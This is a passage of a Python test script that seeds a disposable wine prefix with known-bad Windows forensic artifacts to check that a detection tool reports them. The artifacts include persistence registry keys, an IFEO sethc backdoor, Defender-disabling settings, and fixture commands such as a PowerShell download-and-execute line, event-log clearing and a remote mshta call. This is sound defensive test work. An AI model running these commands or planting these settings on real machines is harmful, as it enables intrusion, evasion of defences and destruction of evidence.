#!/usr/bin/env python3
# Functional test under wine: seeds a THROW-AWAY wine prefix with known-bad
# artifacts (Run key in a user-writable dir, IFEO debugger, changed BootExecute,
# extra LSA package, firewall rule, Defender exclusion, USB, BAM, ShimCache,
# task without SD, unquoted service path), runs winspect and asserts that each
# one is reported WITH the expected reason - and that the benign controls
# (stock LSA package, a normal firewall rule) are not. Never point WINEPREFIX
# at a prefix you care about. Usage: python3 tests/wine/fixtures.py <winspect.exe>
import subprocess, os, sys, json, struct, tempfile
exe = sys.argv[1]
# The wine prefix is a throw-away test sandbox: WINEPREFIX (default ./wpfx).
# The wine binary comes from $WINE, else wine64/wine on PATH, else
# /usr/lib/wine/wine64 (Debian/Ubuntu wine64 package).
import shutil
pfx = os.path.abspath(os.environ.get('WINEPREFIX', 'wpfx'))
# UTF-8 unix locale: wine maps non-ASCII file names through it.
env = dict(os.environ, WINEPREFIX=pfx, WINEDEBUG='-all', LC_ALL='C.UTF-8')
WINE = os.environ.get('WINE') or shutil.which('wine64') or shutil.which('wine') or '/usr/lib/wine/wine64'
WINESERVER = shutil.which('wineserver') or os.path.join(os.path.dirname(WINE), 'wineserver')

def wine(args, timeout=120):
    with tempfile.TemporaryFile() as o, tempfile.TemporaryFile() as e:
        try:
            rc = subprocess.run([WINE] + args, env=env, stdout=o, stderr=e,
                                stdin=subprocess.DEVNULL, timeout=timeout).returncode
        except subprocess.TimeoutExpired:
            rc = 'TIMEOUT'
        o.seek(0); e.seek(0)
        return rc, o.read().decode('utf-8', 'replace'), e.read().decode('utf-8', 'replace')

def reg(*a):
    rc, out, err = wine(['reg', 'add'] + list(a) + ['/f'])
    if rc != 0:
        print('reg add failed:', a, err.strip()[:200])

HK = 'HKLM\\'
# --- autoruns -----------------------------------------------------------------
reg(HK + r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', '/v', 'Updater', '/t', 'REG_SZ', '/d', r'C:\Users\Public\upd.exe')
reg(HK + r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe', '/v', 'Debugger', '/t', 'REG_SZ', '/d', r'C:\windows\system32\cmd.exe')
reg(HK + r'SYSTEM\CurrentControlSet\Control\Session Manager', '/v', 'BootExecute', '/t', 'REG_MULTI_SZ', '/d', r'autocheck autochk *\0evilboot.exe')
reg(HK + r'SYSTEM\CurrentControlSet\Control\Lsa', '/v', 'Notification Packages', '/t', 'REG_MULTI_SZ', '/d', r'scecli\0passfilt_x')
reg(HK + r'SOFTWARE\Microsoft\NetSh', '/v', 'evilhelper', '/t', 'REG_SZ', '/d', r'C:\tools\nshelper.dll')
# newer ASEPs (Autoruns' other tabs, by concept)
HKCU = 'HKCU\\'
reg(HKCU + r'Software\Microsoft\Command Processor', '/v', 'AutoRun', '/t', 'REG_SZ', '/d', r'C:\Users\Public\init.bat')
reg(HKCU + r'Environment', '/v', 'UserInitMprLogonScript', '/t', 'REG_SZ', '/d', r'C:\ProgramData\logon.cmd')
reg(HKCU + r'Software\Classes\ms-settings\Shell\Open\command', '/ve', '/t', 'REG_SZ', '/d', r'C:\windows\system32\cmd.exe /c msuac')
reg(HKCU + r'Software\Microsoft\Office test\Special\Perf', '/ve', '/t', 'REG_SZ', '/d', r'C:\Users\Public\perf.dll')
reg(HK + r'SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls', '/v', 'certx', '/t', 'REG_SZ', '/d', r'C:\windows\system32\certx.dll')
reg(HK + r'SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\EvilTP', '/v', 'DllName', '/t', 'REG_SZ', '/d', r'C:\tools\tp.dll')
reg(HK + r'SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient', '/v', 'DllName', '/t', 'REG_EXPAND_SZ', '/d', r'%systemroot%\system32\w32time.dll')
reg(HK + r'SOFTWARE\Microsoft\Active Setup\Installed Components\{TEST-AS}', '/v', 'StubPath', '/t', 'REG_SZ', '/d', r'C:\Users\Public\as.exe')
# --- firewall -----------------------------------------------------------------
reg(HK + r'SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules',
    '/v', '{TEST-1}', '/t', 'REG_SZ', '/d',
    r'v2.30|Action=Allow|Active=TRUE|Dir=In|Protocol=6|LPort=4444|App=%APPDATA%\x\listener.exe|Name=Test Listener|')
reg(HK + r'SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules',
    '/v', '{TEST-2}', '/t', 'REG_SZ', '/d',
    r'v2.30|Action=Block|Active=TRUE|Dir=Out|Protocol=17|RPort=53|App=C:\windows\system32\svchost.exe|Name=Benign Block|')
# --- defender -----------------------------------------------------------------
reg(HK + r'SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths', '/v', r'C:\Temp\drop', '/t', 'REG_DWORD', '/d', '0')
reg(HK + r'SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection', '/v', 'DisableRealtimeMonitoring', '/t', 'REG_DWORD', '/d', '1')
# --- usb ----------------------------------------------------------------------
reg(HK + r'SYSTEM\CurrentControlSet\Enum\USBSTOR\Disk&Ven_SanDisk&Prod_Cruzer&Rev_1.00\4C530001234567&0', '/v', 'FriendlyName', '/t', 'REG_SZ', '/d', 'SanDisk Cruzer USB Device')
reg(HK + r'SYSTEM\CurrentControlSet\Enum\USBSTOR\Disk&Ven_Generic&Prod_Flash&Rev_0.1\7&2a5c3f1&0', '/v', 'FriendlyName', '/t', 'REG_SZ', '/d', 'Generic Flash')
# --- bam ----------------------------------------------------------------------
ft = struct.pack('<Q', 133500000000000000) + b'\0' * 16
reg(HK + r'SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-1-2-3-1001',
    '/v', r'\Device\HarddiskVolume3\Users\bob\AppData\Local\Temp\a.exe', '/t', 'REG_BINARY', '/d', ft.hex())
reg(HK + r'SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-1-2-3-1001',
    '/v', 'Version', '/t', 'REG_DWORD', '/d', '1')
# legacy (1709) location, left behind after upgrades: must be read too
reg(HK + r'SYSTEM\CurrentControlSet\Services\bam\UserSettings\S-1-5-21-1-2-3-1001',
    '/v', r'\Device\HarddiskVolume3\Tools\oldtool.exe', '/t', 'REG_BINARY', '/d', ft.hex())
# --- shimcache (Win10 layout, 2 entries) ---------------------------------------
def shim_entry(path, t):
    p = path.encode('utf-16-le')
    body = struct.pack('<H', len(p)) + p + struct.pack('<Q', t) + struct.pack('<I', 0)
    return b'10ts' + b'\0' * 4 + struct.pack('<I', len(body)) + body
blob = struct.pack('<I', 0x34) + b'\0' * (0x34 - 4)
blob += shim_entry(r'C:\Users\bob\Downloads\tool.exe', 133400000000000000)
blob += shim_entry(r'C:\windows\system32\notepad.exe', 133300000000000000)
reg(HK + r'SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache', '/v', 'AppCompatCache', '/t', 'REG_BINARY', '/d', blob.hex())
# --- taskcache + task XML ------------------------------------------------------
tree = HK + r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree'
reg(tree + r'\HiddenOne', '/v', 'Id', '/t', 'REG_SZ', '/d', '{11111111-1111-1111-1111-111111111111}')
reg(tree + r'\GoodOne', '/v', 'Id', '/t', 'REG_SZ', '/d', '{22222222-2222-2222-2222-222222222222}')
# Self-relative SD "O:BAG:SYD:(A;;FA;;;BA)" - binary via a tiny known blob is
# awkward; any bytes count as "has SD" for check 1, and an invalid SD is never
# reported as deny, so a placeholder is fine here.
reg(tree + r'\GoodOne', '/v', 'SD', '/t', 'REG_BINARY', '/d', '0100048000000000000000000000000014000000')
tasks = os.path.join(pfx, 'drive_c', 'windows', 'system32', 'Tasks')
os.makedirs(tasks, exist_ok=True)
xml = ('<?xml version="1.0" encoding="UTF-16"?>\n<Task><Settings><Hidden>true</Hidden></Settings>'
       '<Actions><Exec><Command>C:\\windows\\system32\\wscript.exe</Command>'
       '<Arguments>//B C:\\ProgramData\\x.vbs</Arguments></Exec></Actions></Task>')
with open(os.path.join(tasks, 'GoodOne'), 'wb') as f:
    f.write(b'\xff\xfe' + xml.encode('utf-16-le'))
# COM handler tasks: one whose CLSID is registered per-user with a DLL under
# AppData (hijack pattern - flagged), one registered machine-wide in System32
# (resolved, not flagged); and an Exec task whose arguments carry entities.
def task_xml(body):
    return ('<?xml version="1.0" encoding="UTF-16"?>\n<Task version="1.2" '
            'xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">' + body + '</Task>')
CLS_U, CLS_M = '{0F1E2D3C-4B5A-6978-8796-A5B4C3D2E1F0}', '{1A2B3C4D-5E6F-7081-92A3-B4C5D6E7F809}'
for nm, cls in (('ComUser', CLS_U), ('ComMachine', CLS_M)):
    with open(os.path.join(tasks, nm), 'wb') as f:
        f.write(b'\xff\xfe' + task_xml('<Triggers><LogonTrigger/></Triggers><Actions><ComHandler><ClassId>' + cls +
                                        '</ClassId></ComHandler></Actions>').encode('utf-16-le'))
reg(HKCU + r'Software\Classes\CLSID' + '\\' + CLS_U + r'\InprocServer32', '/ve', '/d',
    r'C:\users\Public\AppData\handler.dll')
reg(HK + r'SOFTWARE\Classes\CLSID' + '\\' + CLS_M + r'\InprocServer32', '/ve', '/d',
    r'C:\windows\system32\wscomtest.dll')
with open(os.path.join(tasks, 'Quoted'), 'wb') as f:
    f.write(b'\xff\xfe' + task_xml('<RegistrationInfo><Date>2024-03-01T10:00:00</Date></RegistrationInfo>'
                                    '<Principals><Principal><UserId>S-1-5-18</UserId></Principal></Principals>'
                                    '<Actions><Exec><Command>C:\\windows\\system32\\notepad.exe</Command>'
                                    '<Arguments>/c &quot;echo a&amp;b&quot;</Arguments></Exec></Actions>').encode('utf-16-le'))
# A copied Tasks folder (as from a disk image) for --dir.
tcopy = os.path.join(pfx, 'drive_c', 'tasks_copy', 'Sub')
os.makedirs(tcopy, exist_ok=True)
with open(os.path.join(tcopy, 'Dropped'), 'wb') as f:
    f.write(b'\xff\xfe' + task_xml('<Actions><Exec><Command>C:\\Users\\bob\\AppData\\Local\\Temp\\u.exe</Command>'
                                    '</Exec></Actions>').encode('utf-16-le'))
# comhijack: the Shortcut class (HKLM -> shell32.dll) re-registered per-user
# with a DLL under Public (flagged); XMLHTTP re-registered per-user with the
# SAME file written as %SystemRoot%\... (not flagged).
reg(HKCU + r'Software\Classes\CLSID\{00021401-0000-0000-C000-000000000046}\InprocServer32', '/ve', '/d',
    r'C:\users\Public\shellhook.dll')
reg(HKCU + r'Software\Classes\CLSID\{F5078F35-C551-11D3-89B9-0000F81FE221}\InprocServer32', '/ve', '/t',
    'REG_EXPAND_SZ', '/d', r'%SystemRoot%\System32\MSXML3.dll')
# --- prefetch: an uncompressed v30 SCCA file (pre-MAM layout is still valid) ---
def make_pf(exe='EVIL.EXE', h=0xDEADBEEF, files=None):
    d = bytearray(1024)
    struct.pack_into('<I', d, 0, 30)
    d[4:8] = b'SCCA'
    name = exe.encode('utf-16-le')
    d[16:16 + len(name)] = name
    struct.pack_into('<I', d, 76, h)
    struct.pack_into('<I', d, 84, 0x130)              # long-form file info
    struct.pack_into('<Q', d, 128, 133500000000000000) # last run
    struct.pack_into('<Q', d, 136, 133400000000000000) # previous run
    struct.pack_into('<I', d, 208, 3)                  # run count
    files = files or ('\\VOLUME{1}\\WINDOWS\\SYSTEM32\\NTDLL.DLL\0\\VOLUME{1}\\USERS\\BOB\\APPDATA\\LOCAL\\TEMP\\PAYLOAD.DLL\0'
                      '\\VOLUME{1}\\USERS\\BOB\\DOWNLOADS\\EVIL.EXE\0')
    fb = files.encode('utf-16-le')
    struct.pack_into('<II', d, 100, 400, len(fb))
    d[400:400 + len(fb)] = fb
    vol = 700
    struct.pack_into('<III', d, 108, vol, 1, 120)
    struct.pack_into('<II', d, vol, 96, 9)            # path at +96, 9 chars
    struct.pack_into('<Q', d, vol + 8, 133000000000000000)
    struct.pack_into('<I', d, vol + 16, 0xCAFE1234)
    dev = '\\DEVICE\\X'.encode('utf-16-le')
    d[vol + 96:vol + 96 + len(dev)] = dev
    return bytes(d)
pfdir = os.path.join(pfx, 'drive_c', 'windows', 'Prefetch')
os.makedirs(pfdir, exist_ok=True)
with open(os.path.join(pfdir, 'EVIL.EXE-DEADBEEF.pf'), 'wb') as f:
    f.write(make_pf())
with open(os.path.join(pfdir, 'NOTEPAD.EXE-12345678.pf'), 'wb') as f:
    f.write(make_pf('NOTEPAD.EXE', 0x12345678, '\\VOLUME{1}\\WINDOWS\\SYSTEM32\\NOTEPAD.EXE\0'))

# --- shortcuts: a Startup .lnk that runs powershell, a Recent .lnk -------------
def make_lnk(target, args):
    clsid = bytes([0x01, 0x14, 0x02, 0, 0, 0, 0, 0, 0xC0, 0, 0, 0, 0, 0, 0, 0x46])
    hdr = bytearray(0x4C)
    struct.pack_into('<I', hdr, 0, 0x4C)
    hdr[4:20] = clsid
    struct.pack_into('<I', hdr, 0x14, 0x02 | 0x20 | 0x80)   # LinkInfo | Args | Unicode
    struct.pack_into('<Q', hdr, 0x1C, 133000000000000000)
    base = target.encode('ascii') + b'\0'
    li = bytearray(0x1C)
    total = 0x1C + len(base) + 1                          # + empty suffix
    struct.pack_into('<IIIIIII', li, 0, total, 0x1C, 1, 0, 0x1C, 0, 0x1C + len(base))
    li += base + b'\0'
    a = args.encode('utf-16-le')
    sd = struct.pack('<H', len(args)) + a
    return bytes(hdr) + bytes(li) + sd
def make_destlist(entries):
    # Version-3 (Windows 10) DestList: 32-byte header, then per entry 130 fixed
    # bytes + UTF-16 path + 4 trailing bytes. entries: (number, path, pinned, interactions)
    hdr = struct.pack('<IIIfIIII', 3, len(entries), sum(1 for e in entries if e[2]), 0.0,
                      max(e[0] for e in entries), 0, len(entries), 0)
    body = b''
    for num, path, pinned, inter in entries:
        e = bytearray(130)
        e[72:72 + 8] = b'ws-hr-07'
        struct.pack_into('<I', e, 88, num)
        struct.pack_into('<Q', e, 100, 133500000000000000)
        struct.pack_into('<i', e, 108, 0 if pinned else -1)
        struct.pack_into('<I', e, 116, inter)
        struct.pack_into('<H', e, 128, len(path))
        body += bytes(e) + path.encode('utf-16-le') + b'\0' * 4
    return hdr + body
def make_lnk_crafted(target, args, machine, mac):
    # A link on a REMOVABLE volume (serial 1A2B3C4D, label "STICK") whose
    # WORKING_DIR count claims 1000 characters: the shell reads 260 and the
    # arguments follow - hidden from parsers that trust the count. Ends with a
    # TrackerDataBlock naming the machine and a v1 droid carrying its MAC.
    clsid = bytes([0x01, 0x14, 0x02, 0, 0, 0, 0, 0, 0xC0, 0, 0, 0, 0, 0, 0, 0x46])
    hdr = bytearray(0x4C)
    struct.pack_into('<I', hdr, 0, 0x4C); hdr[4:20] = clsid
    struct.pack_into('<I', hdr, 0x14, 0x02 | 0x10 | 0x20 | 0x80)
    vol = struct.pack('<IIII', 0x16, 2, 0x1A2B3C4D, 0x10) + b'STICK\0'
    base = target.encode('ascii') + b'\0'
    vo = 0x1C; bo = vo + len(vol); so = bo + len(base)
    li = struct.pack('<IIIIIII', so + 1, 0x1C, 1, vo, bo, 0, so) + vol + base + b'\0'
    wd = struct.pack('<H', 1000) + ('C:\\' + ' ' * 257).encode('utf-16-le')
    sd = wd + struct.pack('<H', len(args)) + args.encode('utf-16-le')
    droid = bytes(6) + b'\x00\x11' + bytes(2) + bytes.fromhex(mac.replace(':', ''))
    tr = struct.pack('<II', 0x60, 0xA0000003) + struct.pack('<II', 0x58, 0)
    tr += machine.encode('ascii').ljust(16, b'\0') + bytes(16) + droid + bytes(32)
    return bytes(hdr) + li + sd + tr + b'\0' * 4
users = os.path.join(pfx, 'drive_c', 'users')
# wine names the profile after the unix user; other folders (e.g. the
# non-ASCII test profile below) must not be mistaken for it.
import getpass
uname = getpass.getuser()
if not os.path.isdir(os.path.join(users, uname)):
    uname = sorted(u for u in os.listdir(users) if u.lower() != 'public' and u.isascii())[0]
roam = os.path.join(users, uname, 'AppData', 'Roaming', 'Microsoft', 'Windows')
startup = os.path.join(roam, 'Start Menu', 'Programs', 'Startup')
recent = os.path.join(roam, 'Recent')
os.makedirs(startup, exist_ok=True); os.makedirs(recent, exist_ok=True)
with open(os.path.join(startup, 'Updater.lnk'), 'wb') as f:
    f.write(make_lnk(r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', '-nop -w hidden -enc AAAA'))
with open(os.path.join(recent, 'secret.docx.lnk'), 'wb') as f:
    f.write(make_lnk(r'E:\loot\secret.docx', ''))
with open(os.path.join(recent, 'invoice.lnk'), 'wb') as f:
    f.write(make_lnk_crafted(r'F:\invoice.pdf', '/c start payload.exe', 'ws-hr-07', 'aa:bb:cc:00:11:22'))
with open(os.path.join(startup, 'Helper.lnk'), 'wb') as f:
    f.write(make_lnk_crafted(r'F:\helper.pdf', '/c helper.cmd', 'ws-hr-07', 'aa:bb:cc:00:11:22'))

# --- jump lists: an automatic (compound file) and a custom (back-to-back) one ---
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import cfbwrite
auto = os.path.join(recent, 'AutomaticDestinations'); os.makedirs(auto, exist_ok=True)
cust = os.path.join(recent, 'CustomDestinations'); os.makedirs(cust, exist_ok=True)
with open(os.path.join(auto, '5f7b5f1e01b83767.automaticDestinations-ms'), 'wb') as f:
    f.write(cfbwrite.build([('1', make_lnk(r'F:\usb\plans.pdf', '')),
                            ('2', make_lnk(r'C:\Users\Public\Downloads\tool.exe', '-x')),
                            ('DestList', make_destlist([(1, 'F:\\usb\\plans.pdf', True, 5)]))]))
with open(os.path.join(cust, 'abcdef0123456789.customDestinations-ms'), 'wb') as f:
    f.write(b'\xab' * 24 + make_lnk(r'C:\Windows\System32\mshta.exe', 'http://x/y.hta') +
            b'\x00' * 8 + make_lnk(r'D:\docs\report.docx', ''))

# --- posture: weak settings + an AutoLogon password that must never be printed --
reg(HK + r'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest', '/v', 'UseLogonCredential', '/t', 'REG_DWORD', '/d', '1')
reg(HK + r'SOFTWARE\Policies\Microsoft\Windows\Installer', '/v', 'AlwaysInstallElevated', '/t', 'REG_DWORD', '/d', '1')
reg(HK + r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon', '/v', 'AutoAdminLogon', '/t', 'REG_SZ', '/d', '1')
reg(HK + r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon', '/v', 'DefaultPassword', '/t', 'REG_SZ', '/d', 'hunter2-SECRET')
reg(HK + r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', '/v', 'LocalAccountTokenFilterPolicy', '/t', 'REG_DWORD', '/d', '1')
reg(HK + r'SYSTEM\CurrentControlSet\Control\Lsa', '/v', 'NoLMHash', '/t', 'REG_DWORD', '/d', '0')
reg(HK + r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit', '/v', 'ProcessCreationIncludeCmdLine_Enabled', '/t', 'REG_DWORD', '/d', '1')

# --- hosts: one block entry (fine) and one redirect (flagged) -------------------
etc = os.path.join(pfx, 'drive_c', 'windows', 'system32', 'drivers', 'etc')
os.makedirs(etc, exist_ok=True)
with open(os.path.join(etc, 'hosts'), 'w') as f:
    f.write('# test hosts\r\n127.0.0.1 localhost\r\n0.0.0.0 ads.example\r\n'
            '6.6.6.6 update.vendor.example   # diverted\r\n')

# --- userassist: a ROT13-encoded GUI launch of a program in Temp ----------------
import codecs as _codecs
ua = bytearray(72)
struct.pack_into('<I', ua, 4, 3)
struct.pack_into('<Q', ua, 60, 133500000000000000)
reg(r'HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count',
    '/v', _codecs.encode(r'C:\Users\Public\AppData\Local\Temp\dropper.exe', 'rot13'),
    '/t', 'REG_BINARY', '/d', ua.hex())

# --- mru: an encoded PowerShell typed into Run, two recent documents ---------------
E = r'HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer'
reg(E + r'\RunMRU', '/v', 'a', '/t', 'REG_SZ', '/d', 'notepad\\1')
reg(E + r'\RunMRU', '/v', 'b', '/t', 'REG_SZ', '/d', 'powershell -nop -w hidden -enc SQBFAFgA\\1')
reg(E + r'\RunMRU', '/v', 'MRUList', '/t', 'REG_SZ', '/d', 'ba')
def rdoc(name):
    return (name.encode('utf-16-le') + b'\0\0' + b'\x14\x00').hex()
reg(E + r'\RecentDocs', '/v', '0', '/t', 'REG_BINARY', '/d', rdoc('old.docx'))
reg(E + r'\RecentDocs', '/v', '1', '/t', 'REG_BINARY', '/d', rdoc('new.xlsx'))
reg(E + r'\RecentDocs', '/v', 'MRUListEx', '/t', 'REG_BINARY', '/d', '0100000000000000ffffffff')

# --- programs: a remote-access tool among installed software -------------------
U = HK + r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'
reg(U + r'\AnyDesk', '/v', 'DisplayName', '/t', 'REG_SZ', '/d', 'AnyDesk')
reg(U + r'\AnyDesk', '/v', 'Publisher', '/t', 'REG_SZ', '/d', 'AnyDesk Software GmbH')
reg(U + r'\NotepadPP', '/v', 'DisplayName', '/t', 'REG_SZ', '/d', 'Notepad++ (64-bit x64)')

# --- PowerShell PSReadLine history ------------------------------------------------
psd = os.path.join(roam, 'PowerShell', 'PSReadLine')
os.makedirs(psd, exist_ok=True)
with open(os.path.join(psd, 'ConsoleHost_history.txt'), 'w', newline='') as f:
    f.write('Get-ChildItem C:\\Users\r\n'
            'IEX (New-Object Net.WebClient).DownloadString("http://10.0.0.5/a.ps1")\r\n'
            'Set-MpPreference -DisableRealtimeMonitoring $true\r\n'
            'git status\r\n')

# A profile whose name is not representable in the legacy ANSI code page
# ('ş' is not in cp1252): without the UTF-8 activeCodePage manifest the "A"
# file APIs turned it into "Gülsen", the path did not exist and the user was
# silently skipped by pshistory --all-users.
gpsd = os.path.join(users, 'Gülşen', 'AppData', 'Roaming', 'Microsoft', 'Windows', 'PowerShell', 'PSReadLine')
os.makedirs(gpsd, exist_ok=True)
with open(os.path.join(gpsd, 'ConsoleHost_history.txt'), 'w', newline='') as f:
    f.write('Clear-EventLog -LogName Security\r\n')

# --- browser: a Chrome History and a Firefox places.sqlite (WAL mode, rows
# only in the -wal file), real column names in a shuffled order -------------
import sqlite3
home = os.path.join(users, uname)
chd = os.path.join(home, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default')
os.makedirs(chd, exist_ok=True)
chp = os.path.join(chd, 'History')
for x in (chp, chp + '-journal'):
    if os.path.exists(x): os.remove(x)
con = sqlite3.connect(chp)
con.execute('CREATE TABLE urls(id INTEGER PRIMARY KEY AUTOINCREMENT,url LONGVARCHAR,title LONGVARCHAR,'
            'visit_count INTEGER DEFAULT 0 NOT NULL,typed_count INTEGER DEFAULT 0 NOT NULL,'
            'last_visit_time INTEGER NOT NULL,hidden INTEGER DEFAULT 0 NOT NULL)')
con.execute('CREATE TABLE downloads (id INTEGER PRIMARY KEY,guid VARCHAR NOT NULL,current_path LONGVARCHAR NOT NULL,'
            'target_path LONGVARCHAR NOT NULL,start_time INTEGER NOT NULL,received_bytes INTEGER NOT NULL,'
            'total_bytes INTEGER NOT NULL,state INTEGER NOT NULL,danger_type INTEGER NOT NULL,'
            'interrupt_reason INTEGER NOT NULL,hash BLOB NOT NULL,end_time INTEGER NOT NULL,opened INTEGER NOT NULL,'
            'last_access_time INTEGER NOT NULL,transient INTEGER NOT NULL,referrer VARCHAR NOT NULL,'
            'site_url VARCHAR NOT NULL,tab_url VARCHAR NOT NULL,tab_referrer_url VARCHAR NOT NULL,'
            'http_method VARCHAR NOT NULL,by_ext_id VARCHAR NOT NULL,by_ext_name VARCHAR NOT NULL,'
            'etag VARCHAR NOT NULL,last_modified VARCHAR NOT NULL,mime_type VARCHAR(255) NOT NULL,'
            'original_mime_type VARCHAR(255) NOT NULL)')
con.execute('CREATE TABLE downloads_url_chains (id INTEGER NOT NULL,chain_index INTEGER NOT NULL,url LONGVARCHAR NOT NULL, PRIMARY KEY (id, chain_index))')
wk = lambda unix: (unix + 11644473600) * 1000000          # WebKit / Chrome time
con.execute("INSERT INTO urls VALUES (NULL,'https://www.example.org/news','Example news',3,0,?,0)", (wk(1700000000),))
con.execute("INSERT INTO urls VALUES (NULL,'http://198.51.100.7/panel/login.php','panel',1,1,?,0)", (wk(1700000100),))
def dl(i, target, url, danger, t):
    con.execute('INSERT INTO downloads VALUES (?,?,?,?,?,1,4096,1,?,0,x\'\',?,0,0,0,\'\',\'\',?,\'\',\'GET\',\'\',\'\',\'\',\'\',\'application/octet-stream\',\'\')',
                (i, 'g%d' % i, target, target, wk(t), danger, wk(t + 5), url))
    con.execute('INSERT INTO downloads_url_chains VALUES (?,0,?)', (i, url))
dl(1, r'C:\Users\bob\Downloads\report.pdf', 'https://www.example.org/report.pdf', 0, 1700000200)
dl(2, r'C:\Users\bob\Downloads\invoice.exe', 'https://files.example.net/invoice.exe', 6, 1700000300)
con.commit(); con.close()
ffd = os.path.join(home, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles', 'abcd1234.default-release')
os.makedirs(ffd, exist_ok=True)
ffp = os.path.join(ffd, 'places.sqlite')
for x in (ffp, ffp + '-wal', ffp + '-shm'):
    if os.path.exists(x): os.remove(x)
con = sqlite3.connect(ffp)
con.execute('PRAGMA journal_mode=WAL')
con.execute('PRAGMA wal_autocheckpoint=0')
con.execute('CREATE TABLE moz_places (id INTEGER PRIMARY KEY, url LONGVARCHAR, title LONGVARCHAR, rev_host LONGVARCHAR, '
            'visit_count INTEGER DEFAULT 0, hidden INTEGER DEFAULT 0 NOT NULL, typed INTEGER DEFAULT 0 NOT NULL, '
            'frecency INTEGER DEFAULT -1 NOT NULL, last_visit_date INTEGER , guid TEXT, foreign_count INTEGER DEFAULT 0 NOT NULL)')
con.execute('CREATE TABLE moz_anno_attributes (id INTEGER PRIMARY KEY,name VARCHAR(32) UNIQUE NOT NULL)')
con.execute('CREATE TABLE moz_annos (id INTEGER PRIMARY KEY,place_id INTEGER NOT NULL,anno_attribute_id INTEGER,'
            'content LONGVARCHAR, flags INTEGER DEFAULT 0,expiration INTEGER DEFAULT 0,type INTEGER DEFAULT 0,'
            'dateAdded INTEGER DEFAULT 0,lastModified INTEGER DEFAULT 0)')
us = lambda unix: unix * 1000000
con.execute("INSERT INTO moz_places VALUES (1,'https://www.example.com/','Example','moc.elpmaxe.www.',2,0,0,100,?,'g1',0)", (us(1700000400),))
con.execute("INSERT INTO moz_places VALUES (2,'http://203.0.113.9/dl/tool.ps1','',NULL,1,0,0,100,?,'g2',0)", (us(1700000500),))
con.execute("INSERT INTO moz_anno_attributes VALUES (1,'downloads/metaData'),(2,'downloads/destinationFileURI')")
con.execute("INSERT INTO moz_annos VALUES (1,2,2,'file:///C:/Users/bob/Downloads/tool%20v2.ps1',0,4,3,?,?)", (us(1700000505), us(1700000505)))
con.commit()
import shutil as _shb
_shb.copy(ffp, ffp + '.copy'); _shb.copy(ffp + '-wal', ffp + '-wal.copy')
con.close()
os.replace(ffp + '.copy', ffp); os.replace(ffp + '-wal.copy', ffp + '-wal')
if os.path.exists(ffp + '-shm'): os.remove(ffp + '-shm')

# --- activities: a Windows Timeline database (column order as in Windows 10)
acd = os.path.join(home, 'AppData', 'Local', 'ConnectedDevicesPlatform', 'L.bob')
os.makedirs(acd, exist_ok=True)
acp = os.path.join(acd, 'ActivitiesCache.db')
if os.path.exists(acp): os.remove(acp)
con = sqlite3.connect(acp)
con.execute('CREATE TABLE Activity ([Id] GUID PRIMARY KEY NOT NULL, [AppId] TEXT NOT NULL, [PackageIdHash] TEXT, '
            '[AppActivityId] TEXT, [ActivityType] INT NOT NULL, [ActivityStatus] INT NOT NULL, [ParentActivityId] GUID, '
            '[Tag] TEXT, [Group] TEXT, [MatchId] TEXT, [LastModifiedTime] DATETIME NOT NULL, [ExpirationTime] DATETIME NOT NULL, '
            '[Payload] BLOB, [Priority] INT, [IsLocalOnly] INT, [PlatformDeviceId] TEXT, [CreatedInCloud] DATETIME, '
            '[StartTime] DATETIME, [EndTime] DATETIME)')
def act(i, appid, typ, payload, start, end):
    con.execute('INSERT INTO Activity VALUES (?,?,NULL,NULL,?,1,NULL,NULL,NULL,NULL,?,?,?,1,1,NULL,0,?,?)',
                (bytes([i]) * 16, json.dumps(appid), typ, end, end + 86400, json.dumps(payload).encode(), start, end))
act(1, [{'application': 'C:\\Users\\bob\\AppData\\Local\\Temp\\rclone.exe', 'platform': 'x_exe_path'},
        {'application': 'rclone.exe', 'platform': 'packageId'}], 6,
    {'type': 'UserEngaged', 'activeDurationSeconds': 345, 'appDisplayName': 'rclone'}, 1700001000, 1700001345)
act(2, [{'application': 'Microsoft.Windows.Notepad', 'platform': 'packageId'},
        {'application': '{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\\notepad.exe', 'platform': 'x_exe_path'}], 5,
    {'displayText': 'passwords.txt', 'appDisplayName': 'Notepad', 'description': 'C:\\Users\\bob\\Desktop\\passwords.txt'},
    1700002000, 0)
con.commit(); con.close()

# --- pca: Windows 11 PCA text files in both encodings the write-ups report
# (UTF-16LE without BOM, and ANSI cp1252), plus a line of unknown shape --------
pcad = os.path.join(pfx, 'drive_c', 'windows', 'appcompat', 'pca')
os.makedirs(pcad, exist_ok=True)
with open(os.path.join(pcad, 'PcaAppLaunchDic.txt'), 'wb') as f:
    f.write(('C:\\Users\\bob\\AppData\\Local\\Temp\\stage2.exe|2024-03-05 08:09:10.123\r\n'
             'C:\\Program Files\\Notepad++\\notepad++.exe|2024-03-04 07:00:00.000\r\n').encode('utf-16-le'))
with open(os.path.join(pcad, 'PcaGeneralDb0.txt'), 'wb') as f:
